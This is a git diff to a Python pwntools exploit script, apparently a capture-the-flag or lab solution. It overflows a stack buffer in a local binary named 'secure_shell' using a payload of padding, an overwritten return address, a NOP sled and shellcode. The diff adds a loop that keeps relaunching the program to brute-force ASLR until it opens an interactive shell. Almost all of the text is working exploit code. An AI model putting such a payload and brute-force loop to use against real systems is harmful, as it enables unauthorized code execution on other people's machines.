@@ -9,6 +9,8 @@
 import os
 from pwn import *
 
+## Create the payload
+
 junk = b'A' * 48
 nop_sled = b'\x90' * 1500
 eip = p32(0xffffd620 + 200)
@@ -25,3 +27,17 @@ shell_code += b"\x9b\xb0\x31\xea\x7d\xf3\x36"
 
 payload = junk + eip + nop_sled + shell_code
 sys.stdout.buffer.write(payload)
+
+## Brute force the ASLR measurements
+while True:
+    secure_shell = process('./secure_shell')
+    secure_shell.recvuntil(b'Please enter secure shell password:')
+    secure_shell.sendline(payload)
+
+    try:
+        for i in range(0, 5):
+            secure_shell.recvline()
+
+        secure_shell.interactive()
+    except EOFError:
+        print('fail')
